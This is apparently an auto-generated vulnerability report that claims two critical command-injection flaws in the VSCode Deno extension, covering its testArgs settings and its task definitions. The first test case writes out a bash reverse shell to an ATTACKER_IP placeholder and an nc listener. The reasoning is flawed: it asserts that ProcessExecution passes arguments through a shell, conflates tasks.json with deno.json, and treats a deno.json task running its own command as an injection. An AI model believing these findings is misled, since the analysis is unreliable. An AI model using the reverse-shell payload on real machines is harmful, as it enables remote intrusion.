### Vulnerability List

* Vulnerability Name: Command Injection via `deno.codeLens.testArgs` and `deno.testing.args` settings

* Description:
    1. The VSCode Deno extension allows users to configure additional arguments for the `deno test` command via the `deno.codeLens.testArgs` and `deno.testing.args` settings. These settings are intended to provide flexibility in test execution, such as adding `--allow-net` or other flags.
    2. A threat actor can create a malicious repository that includes a `.vscode/settings.json` file. This settings file can be crafted to include malicious commands within the `deno.codeLens.testArgs` or `deno.testing.args` settings. For example, setting `deno.codeLens.testArgs` to `["--allow-all", "; malicious command;"]`.
    3. When a victim opens this malicious repository in VSCode and has the Deno extension enabled for the workspace, the malicious settings are loaded.
    4. If the victim then uses the "Run Test" code lens or the Test Explorer to execute a test within the malicious repository, the extension will construct a `deno test` command incorporating the malicious arguments from the settings.
    5. The extension uses `vscode.ProcessExecution` to execute the constructed command. Due to insufficient sanitization of the arguments from the settings, the malicious command injected by the threat actor will be executed by the system shell.

* Impact:
    - Remote Code Execution (RCE). A threat actor can execute arbitrary commands on the victim's machine with the privileges of the VSCode process. This can lead to full system compromise, data exfiltration, installation of malware, and other malicious activities.

* Vulnerability Rank: critical

* Currently Implemented Mitigations:
    - None. The extension directly uses the values from the settings to construct and execute the command without sanitization or validation.

* Missing Mitigations:
    - Input sanitization and validation: The extension should sanitize and validate the arguments provided in `deno.codeLens.testArgs` and `deno.testing.args` settings. It should ensure that no shell- Metacharacters or command separators are present in the arguments.
    - Command construction using safe APIs: Instead of directly constructing shell commands from user-provided input, the extension should use APIs that prevent command injection by separating commands and arguments, such as using array-based arguments for `child_process.spawn` or similar functions if VSCode API allows more secure command execution.

* Preconditions:
    1. Victim has VSCode installed with the Deno extension.
    2. Victim opens a malicious repository in VSCode and enables the Deno extension for the workspace (either explicitly or by having a `deno.json` in the workspace root if auto-enable is active).
    3. Malicious repository contains a `.vscode/settings.json` file with malicious commands in `deno.codeLens.testArgs` or `deno.testing.args` settings.
    4. Victim triggers test execution by using "Run Test" code lens or Test Explorer within the malicious repository.

* Source Code Analysis:

    1. **`client/src/commands.ts` - `test` function:**
    ```typescript
    export function test(
      _context: vscode.ExtensionContext,
      extensionContext: DenoExtensionContext,
    ): Callback {
      return async (uriStr: string, name: string, options: TestCommandOptions) => {
        // ...
        const config = vscode.workspace.getConfiguration(EXTENSION_NS, uri);
        const testArgs: string[] = [
          ...(config.get<string[]>("codeLens.testArgs") ?? []), // Vulnerable point: Reading testArgs from config
        ];
        // ...
        const nameRegex = `/^${name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}$/`;
        const args = ["test", ...testArgs, "--filter", nameRegex, filePath]; // Constructing command arguments
        // ...
        const definition: tasks.DenoTaskDefinition = {
          type: tasks.TASK_TYPE,
          command: "test",
          args, // Arguments including potentially malicious testArgs
          env,
        };

        assert(workspaceFolder);
        const denoCommand = await getDenoCommandName();
        const task = tasks.buildDenoTask( // Calling buildDenoTask with potentially malicious definition
          workspaceFolder,
          denoCommand,
          definition,
          `test "${name}"`,
          args,
          ["$deno-test"],
        );
        // ...
        await vscode.tasks.executeTask(task); // Executing the task
        // ...
      };
    }
    ```
    The `test` function retrieves `deno.codeLens.testArgs` from the workspace configuration without any sanitization. These arguments are directly passed into the `args` array used to construct the `DenoTaskDefinition`.

    2. **`client/src/tasks.ts` - `buildDenoTask` function:**
    ```typescript
    export function buildDenoTask(
      target: vscode.WorkspaceFolder,
      process: string,
      definition: DenoTaskDefinition,
      name: string,
      args: string[],
      problemMatchers: string[],
    ): vscode.Task {
      const exec = new vscode.ProcessExecution(
        process,
        args, // Arguments are passed directly to ProcessExecution
        definition,
      );

      return new vscode.Task(
        definition,
        target,
        name,
        TASK_SOURCE,
        exec,
        problemMatchers,
      );
    }
    ```
    The `buildDenoTask` function creates a `vscode.Task` with a `vscode.ProcessExecution`. Critically, the `args` array, which can contain malicious commands from `deno.codeLens.testArgs`, is passed directly to `vscode.ProcessExecution`. `vscode.ProcessExecution` when executed by `vscode.tasks.executeTask` will execute the command with the system shell, making it vulnerable to command injection if arguments are not properly sanitized.

    3. **`docs/testing.md` - `deno.codeLens.testArgs` and `deno.testing.args` settings:**
    ```markdown
    - `deno.codeLens.testArgs`: Provides additional arguments that should be set
      when invoking the Deno CLI test from a code lens. _array of strings, default
      `[ "--allow-all" ]`_.
    - `deno.testing.args`: Arguments to use when running tests via the Test
      Explorer. Defaults to `[ \"--allow-all\" ]`.
    ```
    The documentation confirms the existence and purpose of these settings, which are the source of the vulnerability.

* Security Test Case:

    1. Create a new directory named `malicious-repo`.
    2. Inside `malicious-repo`, create a subdirectory named `.vscode`.
    3. Inside `.vscode`, create a file named `settings.json` with the following content to inject a reverse shell command (example for Linux, adjust for other OS if needed):
    ```json
    {
      "deno.enable": true,
      "deno.codeLens.testArgs": [
        "--allow-all",
        "; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' #"
      ]
    }
    ```
    Replace `ATTACKER_IP` and `ATTACKER_PORT` with your attacker machine's IP address and listening port.
    4. In `malicious-repo`, create a file named `test.ts` with a simple Deno test:
    ```typescript
    Deno.test("simple test", () => {
      console.log("Test running");
    });
    ```
    5. Start a netcat listener on your attacker machine: `nc -lvnp ATTACKER_PORT`.
    6. Open the `malicious-repo` directory in VSCode. Ensure the Deno extension is active for this workspace.
    7. In VSCode, open the `test.ts` file. You should see the "Run Test" code lens above the `Deno.test` declaration.
    8. Click the "Run Test" code lens.
    9. Observe that the test executes (you should see "Test running" in the output).
    10. On your attacker machine, you should receive a reverse shell connection, indicating successful command injection and RCE.


* Vulnerability Name: Command Injection via Task Definitions

* Description:
    The VSCode Deno extension allows users to define tasks in `tasks.json` that execute Deno CLI commands. The extension parses these task definitions and executes the specified Deno command using `vscode.tasks.executeTask`. A malicious repository can include a crafted `tasks.json` file with a command containing shell metacharacters. When a victim opens the malicious repository in VSCode with the Deno extension active and attempts to run a task from the sidebar, the shell metacharacters in the command can be interpreted by the system shell, leading to command injection.

* Impact:
    Remote Code Execution (RCE). An attacker can execute arbitrary commands on the victim's machine with the privileges of the VSCode process by crafting a malicious `tasks.json` file within a repository.

* Vulnerability Rank: critical

* Currently Implemented Mitigations:
    None. The extension directly uses the command and arguments from `tasks.json` to execute the Deno CLI task without any sanitization or validation of the command or arguments.

* Missing Mitigations:
    - Input sanitization of task commands and arguments defined in `tasks.json`.
    - Command execution should avoid using shell interpretation when executing tasks. Use direct execution of the Deno CLI with arguments as an array to prevent shell injection.
    - Implement a secure way to parse and execute tasks, potentially using a safer task definition format or escaping shell-sensitive characters.
    - User should be warned before executing tasks from untrusted repositories.

* Preconditions:
    1. Victim has VSCode with the Deno extension installed and enabled.
    2. Victim opens a malicious repository containing a crafted `tasks.json` file.
    3. Victim attempts to run a task from the Deno Tasks sidebar provided by the extension.

* Source Code Analysis:

    1. **`client\src\tasks_sidebar.ts`:** The `DenoTasksTreeDataProvider` is responsible for displaying tasks in the sidebar.
    2. **`DenoTasksTreeDataProvider.getChildren`:** This function in `tasks_sidebar.ts` retrieves tasks by calling `this.taskProvider.provideTasks()`.
    3. **`DenoTaskProvider.provideTasks`:** This function, implemented in `client\src\tasks.ts`, is registered as a `TaskProvider`. Initially, it provides a set of predefined tasks.
    4. **`DenoTaskProvider.provideTasks` (Config Tasks):**  The `provideTasks` function also fetches config tasks from the language server via `client.sendRequest(taskReq)` where `taskReq` is `deno/taskDefinitions`. The language server, in turn, reads tasks from `deno.json` or `deno.jsonc` files in the workspace.
    5. **`buildDenoConfigTask` in `client\src\tasks.ts`:** This function constructs a `vscode.Task` object from the task definition. It takes the task `name` and `command` (or `detail`) directly from the config. It then creates a `vscode.ProcessExecution` with `process` (deno command path) and `args` (`["task", ...args]`). Critically, it uses `ProcessExecution` which, by default, may interpret shell commands if the arguments are not carefully handled.
    6. **`DenoTasksTreeDataProvider.#runTask`:** When a user clicks "Run Task" in the sidebar, the `deno.client.runTask` command is executed, which calls `tasks.executeTask(task.task)`.  This executes the `vscode.Task` object, including the potentially malicious command from `tasks.json`.

    ```typescript
    // File: client\src\tasks.ts

    export function buildDenoConfigTask(
      scope: vscode.WorkspaceFolder,
      process: string,
      name: string,
      command: string | undefined, // Command from deno.json task definition
      sourceUri?: vscode.Uri,
    ): vscode.Task {
      const args = [];
      if (
        sourceUri &&
        vscode.Uri.joinPath(sourceUri, "..").toString() != scope.uri.toString()
      ) {
        const configPath = path.relative(scope.uri.fsPath, sourceUri.fsPath);
        args.push("-c", configPath);
      }
      args.push(name); // Task name from deno.json
      const task = new vscode.Task(
        {
          type: TASK_TYPE,
          name: name,
          command: "task",
          args,
          sourceUri,
        },
        scope,
        name,
        TASK_SOURCE,
        new vscode.ProcessExecution(process, ["task", ...args]), // ProcessExecution, potential shell injection
        ["$deno"],
      );
      task.detail = `$ ${command}`; // Displayed command, can be misleading if injected
      return task;
    }
    ```

    **Visualization:**

    ```mermaid
    sequenceDiagram
        participant User
        participant VSCode Deno Extension
        participant Deno Language Server
        participant OS Shell

        User->>VSCode Deno Extension: Open Malicious Repository
        VSCode Deno Extension->>Deno Language Server: Request Task Definitions (deno/taskDefinitions)
        Deno Language Server-->>VSCode Deno Extension: Task Definitions from deno.json (malicious command)
        VSCode Deno Extension->>User: Display Tasks in Sidebar (malicious task present)
        User->>VSCode Deno Extension: Click "Run Task" on malicious task
        VSCode Deno Extension->>VSCode Deno Extension: buildDenoConfigTask (command from deno.json)
        VSCode Deno Extension->>OS Shell: Execute Task (ProcessExecution with malicious command)
        OS Shell-->>Victim Machine: Arbitrary command execution
    ```


* Security Test Case:

    1. **Setup:**
        - Create a new directory for the malicious repository.
        - Create a file named `deno.json` inside the directory with the following content, which contains a command injection payload within a task definition:

        ```jsonc
        {
          "tasks": {
            "maliciousTask": "echo 'Vulnerable!' && touch /tmp/pwned"
          }
        }
        ```

        - Create a file named `test.ts` (or any `.ts` file) in the same directory:
        ```typescript
        console.log("Test file");
        ```
        - Initialize a VSCode workspace by opening the malicious repository directory in VSCode.
        - Ensure the Deno extension is enabled for the workspace (if not enabled by default, use "Deno: Enable").
        - Open the Deno Tasks sidebar (if not already visible, use "View" -> "Open View..." -> "Deno Tasks").

    2. **Execution:**
        - In the Deno Tasks sidebar, you should see "maliciousTask" under your workspace folder.
        - Click the "Run Task" icon (wrench icon) next to "maliciousTask".

    3. **Verification:**
        - Observe the output panel in VSCode. It should display "Vulnerable!".
        - Check if the file `/tmp/pwned` has been created on the system. If it exists, the command injection was successful.
